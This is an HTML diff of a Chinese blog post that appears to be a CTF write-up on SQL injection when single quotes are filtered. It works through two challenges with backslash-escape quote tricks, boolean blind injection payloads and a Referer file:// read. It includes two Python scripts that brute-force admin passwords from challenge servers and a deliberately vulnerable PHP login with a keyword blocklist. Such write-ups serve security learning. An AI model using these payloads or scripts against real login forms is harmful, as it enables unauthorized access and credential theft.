@@ -210,95 +210,26 @@
 
         <div class="post-content">
             <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>通常来说，在进行字符型的SQL注入时，都需要先将前面的引号等（以单引号为例）进行闭合才能执行我们构造的SQL语句，那么如果单引号被过滤了，是否还能够成功的SQL注入呢？</p>
-<p>答案是可以，当你在判断登录时使用的是如下SQL语句：</p>
-<pre><code class="sql">select user from user where user=&#39;$_POST[username]&#39; and password=&#39;$_POST[password]&#39;;
-</code></pre>
+<p>答案是可以，当你在判断登录时使用的是如下SQL语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'$_POST[username]'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$_POST[password]'</span>;</span><br></pre></td></tr></table></figure></p>
 <p>那么即使在过滤的时候将单引号过滤掉了，还是可以进行一定程度上的注入的，下面通过两道CTF题来进行介绍。</p>
 <p><br></p>
-<h3 id="0x01-BJDCTF-2020-简单注入"><a href="#0x01-BJDCTF-2020-简单注入" class="headerlink" title="0x01 [BJDCTF 2020]简单注入"></a>0x01 [BJDCTF 2020]简单注入</h3><p>进入题目后就是一个登录框，名字也提示了要注入：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000045489.png" alt="在这里插入图片描述"><br>扫描目录发现hint.txt中的提示：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000146668.png" alt="在这里插入图片描述"><br>告诉了我们登录的sql语句：</p>
-<pre><code class="sql">select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;
-</code></pre>
+<h3 id="0x01-BJDCTF-2020-简单注入"><a href="#0x01-BJDCTF-2020-简单注入" class="headerlink" title="0x01 [BJDCTF 2020]简单注入"></a>0x01 [BJDCTF 2020]简单注入</h3><p>进入题目后就是一个登录框，名字也提示了要注入：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000045489.png" alt="在这里插入图片描述"><br>扫描目录发现hint.txt中的提示：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000146668.png" alt="在这里插入图片描述"><br>告诉了我们登录的sql语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$_POST["username"]'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$_POST["password"]'</span>;</span><br></pre></td></tr></table></figure></p>
 <p>稍微fuzz一下可以发现过滤了<code>&#39;</code>、<code>&quot;</code>、<code>=</code>、<code>-</code>、<code>and</code>、<code>select</code>等关键词，其中关键就是这个单引号，由hint已知这里是需要单引号进行闭合的，而单引号又被过滤了。</p>
 <p>可以发现注释符<code>#</code>和反斜杠<code>\</code>并没有被过滤，既然注释符没有过滤，那么我们就可以注释掉最后一个单引号，这样就只剩下3个单引号需要处理。</p>
-<p>而如果我们输入的用户名以反斜杠<code>\</code>结尾，例如POST：<code>username=admin\&amp;password=123456#</code>，那么拼接进去后，<code>\</code>就可以将第2个单引号转义掉，如下：</p>
-<pre><code class="sql">select * from users where username=&#39;admin\&#39; and password=&#39;123456#&#39;;
-</code></pre>
+<p>而如果我们输入的用户名以反斜杠<code>\</code>结尾，例如POST：<code>username=admin\&amp;password=123456#</code>，那么拼接进去后，<code>\</code>就可以将第2个单引号转义掉，如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin\' and password='</span><span class="number">123456</span><span class="comment">#';</span></span><br></pre></td></tr></table></figure></p>
 <p>这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是<code>admin\&#39; and password=</code>这个整体，而这个用户名显然不存在，所以还是登录失败。</p>
 <p>但是别忘了我们还有一个password变量可控，实际上我们已经解决了单引号的闭合问题了，下面的就是常规的思路，比如我们构造password为<code>or 2&gt;1#</code></p>
-<p>那么拼接后的sql语句就为：</p>
-<pre><code class="sql">select * from users where username=&#39;admin\&#39; and password=&#39; or 2&gt;1#&#39;;
-</code></pre>
+<p>那么拼接后的sql语句就为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin\' and password='</span> <span class="keyword">or</span> <span class="number">2</span>&gt;<span class="number">1</span><span class="comment">#';</span></span><br></pre></td></tr></table></figure></p>
 <p>很显然上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注：</p>
 <p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324003015750.png" alt="在这里插入图片描述"></p>
 <p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324003039966.png" alt="在这里插入图片描述"></p>
 <p>最终脚本如下：</p>
-<pre><code class="python">import requests
-
-s = requests.Session()
-url = &#39;http://6644a23a-145c-40a9-a969-90ff1f80ac4d.node3.buuoj.cn/&#39;
-flag = &#39;&#39;
-
-def exp(i, j):
-    payload = f&quot;or (ascii(substr(password,{i},1))&gt;{j})#&quot;
-    data = {
-        &quot;username&quot;: &quot;admin\\&quot;,
-        &quot;password&quot;: payload
-    }
-    r = s.post(url, data=data)
-    if &quot;BJD needs to be stronger&quot; in r.text:
-        return True
-    else:
-        return False
-
-for i in range(1, 100):
-    low = 32 
-    high = 127
-    while (low &lt;= high):
-        mid = (low + high)//2
-        if (exp(i, mid)):
-            low = mid + 1
-        else:
-            high = mid - 1
-    flag += chr((low+high+1)//2)
-    print(flag)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://6644a23a-145c-40a9-a969-90ff1f80ac4d.node3.buuoj.cn/'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i, j)</span>:</span></span><br><span class="line">    payload = <span class="string">f"or (ascii(substr(password,<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>)#"</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">        <span class="string">"password"</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"BJD needs to be stronger"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span> </span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += chr((low+high+<span class="number">1</span>)//<span class="number">2</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
 <p>运行脚本得到admin的密码：OhyOuFOuNdit，登录即可得到flag。<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/2020032400321152.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h3 id="0x02-某道CTF入群题"><a href="#0x02-某道CTF入群题" class="headerlink" title="0x02 某道CTF入群题"></a>0x02 某道CTF入群题</h3><p>同样也是一到登陆题，在<code>check.php</code>中给出了源码如下：</p>
-<pre><code class="php">&lt;?php 
-include &quot;config.php&quot;;
-error_reporting(0);
-highlight_file(__FILE__); 
-
-$check_list = &quot;/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\&#39;|admin|limit|=_| |in|&lt;|&gt;|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;
-if(preg_match($check_list, $_POST[&#39;username&#39;])){
-    die(&#39;&lt;h1&gt;Hacking first,then login!Username is very special.&lt;/h1&gt;&#39;); 
-}
-if(preg_match($check_list, $_POST[&#39;passwd&#39;])){
-    die(&#39;&lt;h1&gt;Hacking first,then login!No easy password.&lt;/h1&gt;&#39;);
-}
-$query=&quot;select user from user where user=&#39;$_POST[username]&#39; and passwd=&#39;$_POST[passwd]&#39;&quot;; 
-$result = mysql_query($query);
-$result = mysql_fetch_array($result);
-$passwd = mysql_fetch_array(mysql_query(&quot;select passwd from user where user=&#39;admin&#39;&quot;));
-if($result[&#39;user&#39;]){
-    echo &quot;&lt;h1&gt;Welcome to CTF Training!Please login as role of admin!&lt;/h1&gt;&quot;; 
-}
-if(($passwd[&#39;passwd&#39;])&amp;&amp;($passwd[&#39;passwd&#39;] === $_POST[&#39;passwd&#39;])){
-    $url = $_SERVER[&quot;HTTP_REFERER&quot;];
-    $parts = parse_url($url);
-    if(empty($parts[&#39;host&#39;]) || $parts[&#39;host&#39;] != &#39;localhost&#39;){
-        die(&#39;&lt;h1&gt;The website only can come from localhost!You are not admin!&lt;/h1&gt;&#39;);
-    }
-    else{
-        readfile($url);
-    }
-}
-?&gt;
-</code></pre>
-<p>可以看到这一题的sql语句同样是下面这样：</p>
-<pre><code class="sql">select user from user where user=&#39;$_POST[username]&#39; and passwd=&#39;$_POST[passwd]&#39;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line">$check_list = <span class="string">"/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\'|admin|limit|=_| |in|&lt;|&gt;|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($check_list, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;Hacking first,then login!Username is very special.&lt;/h1&gt;'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match($check_list, $_POST[<span class="string">'passwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;Hacking first,then login!No easy password.&lt;/h1&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query=<span class="string">"select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"</span>; </span><br><span class="line">$result = mysql_query($query);</span><br><span class="line">$result = mysql_fetch_array($result);</span><br><span class="line">$passwd = mysql_fetch_array(mysql_query(<span class="string">"select passwd from user where user='admin'"</span>));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'user'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome to CTF Training!Please login as role of admin!&lt;/h1&gt;"</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(($passwd[<span class="string">'passwd'</span>])&amp;&amp;($passwd[<span class="string">'passwd'</span>] === $_POST[<span class="string">'passwd'</span>]))&#123;</span><br><span class="line">    $url = $_SERVER[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">    $parts = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;The website only can come from localhost!You are not admin!&lt;/h1&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        readfile($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这一题的sql语句同样是下面这样：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'$_POST[username]'</span> <span class="keyword">and</span> passwd=<span class="string">'$_POST[passwd]'</span></span><br></pre></td></tr></table></figure></p>
 <p>只不过过滤了更多的东西，下面思考如果进行绕过：</p>
 <ul>
 <li><code>or</code>可以用<code>||</code>进行绕过。</li>
@@ -316,31 +247,7 @@ if(($passwd[&#39;passwd&#39;])&amp;&amp;($passwd[&#39;passwd&#39;] === $_POST[&#
 <p>在题目中进行一下验证，利用Intruder模块爆破一下：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324171234331.png" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324171154210.png" alt="在这里插入图片描述"><br>可以看到在以<code>d</code>和<code>D</code>开头时都返回了真，是因为使用regexp正则匹配时是不区分大小写，通常来说只需要加上<code>binary</code>即可解决这个问题，如<code>||binart/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>，但是这一题过滤了<code>in</code>，所以目前我还没有想到好的方法进行大小写匹配。</p>
 <p>但实际上这一题的密码都是由小写组成的，否则就只能去遍历所有情况进行爆破了。</p>
 <p>最终的脚本如下：</p>
-<pre><code class="python">import requests
-
-s = requests.Session()
-url = &quot;http://47.102.127.194:8801/check.php&quot;
-
-str = &#39;1234567890qwertyuiopasdfghjklzxcvbnm&#39;
-temp = &quot;&quot;
-flag = &quot;&quot;
-
-for i in range(30):
-    for j in str:
-        temp = flag
-        temp += j
-        #注意%00要用\00表示
-        payload = f&quot;||passwd/**/regexp/**/\&quot;^{temp}\&quot;;\00&quot;
-        data = {
-            &quot;username&quot;:&quot;\\&quot;,
-            &quot;passwd&quot;:payload
-        }
-        r = s.post(url, data=data)
-        if &quot;CTF Training&quot; in r.text:
-            flag = temp
-            print(flag)
-            break
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://47.102.127.194:8801/check.php"</span></span><br><span class="line"></span><br><span class="line">str = <span class="string">'1234567890qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line">temp = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        temp = flag</span><br><span class="line">        temp += j</span><br><span class="line">        <span class="comment">#注意%00要用\00表示</span></span><br><span class="line">        payload = <span class="string">f"||passwd/**/regexp/**/\"^<span class="subst">&#123;temp&#125;</span>\";\00"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"\\"</span>,</span><br><span class="line">            <span class="string">"passwd"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"CTF Training"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = temp</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>运行脚本得到密码：d0itr1ght<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324173653172.png" alt="在这里插入图片描述"><br>得到密码后，后面的就比较简单了，<code>admin</code>用<code>adm/**/in</code>绕过，然后用Referer利用<code>file://localhost/..</code>伪造本地读文件即可:<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324174710574.png" alt="在这里插入图片描述"><br>源码中得到flag：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324174734206.png" alt="在这里插入图片描述"></p>
 
         </div>
